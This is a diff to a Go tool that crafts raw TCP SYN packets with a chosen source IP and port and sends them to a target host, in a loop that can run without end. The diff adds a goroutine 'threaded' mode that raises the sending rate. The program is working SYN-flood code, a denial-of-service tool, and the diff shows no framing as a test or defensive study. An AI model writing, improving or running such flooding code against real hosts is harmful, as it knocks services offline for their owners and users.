@@ -52,6 +52,33 @@ func createSYNPacket(srcIP string, dstIP string, srcPort int, dstPort int) ([]by
 	return buffer.Bytes(), nil
 }
 
+func sendPacket(dstIP *string, dstPort *int, iface *string, packet []byte) {
+	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_TCP)
+		if err != nil {
+			logger.Error().Err(err).Msg("Failed to create socket")
+			return
+		}
+		defer syscall.Close(fd)
+
+		
+		err = syscall.BindToDevice(fd, *iface)
+		if err != nil {
+			logger.Error().Err(err).Msg("Failed to bind to device")
+			return
+		}
+
+		err = syscall.Sendto(fd, packet, 0, &syscall.SockaddrInet4{
+			Port: *dstPort,
+			Addr: [4]byte(net.ParseIP(*dstIP).To4()),
+		})
+		if err != nil {
+			logger.Error().Err(err).Msg("Failed to send packet")
+			return
+		}
+
+		logger.Debug().Str("host", *dstIP).Int("port", *dstPort).Msg("Packet sent")
+}
+
 func main() {
 	zerolog.TimeFieldFormat = zerolog.TimeFormatUnix
 	zerolog.SetGlobalLevel(zerolog.InfoLevel)
@@ -176,24 +203,14 @@ func main() {
 
 	debug := parser.Flag("D", "debug", &argparse.Options{
 		Required: false,
-		Help:     "Enable debug mode",
+		Help:     "Enable debug mode. You should avoid using this in production , or with threaded mode, as it slows down the program",
 		Default:  false,
 	})
 
-	threaded := parser.Int("t", "threaded", &argparse.Options{
+	threaded := parser.Flag("t", "threaded", &argparse.Options{
 		Required: false,
-		Help:     "Enable threaded brute force mode with a limit of n threads. No effect if password list is not used",
-		Validate: func(args []string) error {
-			val, err := strconv.Atoi(args[0])
-			if err != nil {
-				return errors.New("thread count must be a number")
-			}
-
-			if val <= 1 {
-				return errors.New("thread count must be greater than 1")
-			}
-			return nil
-		},
+		Help:     "Enable packet creation and socket threading, default is false",
+		Default: false,
 	})
 
 	err := parser.Parse(os.Args)
@@ -206,42 +223,33 @@ func main() {
 		logger.Debug().Msg("Debug mode enabled")
 	}
 
-	if *threaded > 0 {
-		logger.Fatal().Msg("Threaded mode is not supported yet")
-	}
-
+	if *threaded {
+		pktCh := make(chan []byte)
 	
+		for i := 0; i < *number || *number == -1; i++ {
+			go func() {
+				packet, err := createSYNPacket(*srcIP, *dstIP, *srcPort, *dstPort)
+				if err != nil {
+					logger.Error().Err(err).Msg("Failed to create packet")
+					return
+				}
+				pktCh <- packet
+			}()
 
-	for i := 0; i < *number || *number == -1; i++ {
-		packet, err := createSYNPacket(*srcIP, *dstIP, *srcPort, *dstPort)
-		if err != nil {
-			continue
+			go func() {
+				packet := <-pktCh
+				sendPacket(dstIP, dstPort, iface, packet)
+			}()
 		}
-
-		fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_TCP)
-		if err != nil {
-			logger.Error().Err(err).Msg("Failed to create socket")
-			continue
+	} else {
+		for i := 0; i < *number || *number == -1; i++ {
+			packet, err := createSYNPacket(*srcIP, *dstIP, *srcPort, *dstPort)
+			if err != nil {
+				logger.Error().Err(err).Msg("Failed to create packet")
+				return
+			}
+			sendPacket(dstIP, dstPort, iface, packet)
 		}
-		defer syscall.Close(fd)
-
-		
-		err = syscall.BindToDevice(fd, *iface)
-		if err != nil {
-			logger.Error().Err(err).Msg("Failed to bind to device")
-			continue
-		}
-
-		err = syscall.Sendto(fd, packet, 0, &syscall.SockaddrInet4{
-			Port: *dstPort,
-			Addr: [4]byte(net.ParseIP(*dstIP).To4()),
-		})
-		if err != nil {
-			logger.Error().Err(err).Msg("Failed to send packet")
-			continue
-		}
-
-		logger.Debug().Str("host", *dstIP).Int("port", *dstPort).Msg("Packet sent")
 	}
 }
 
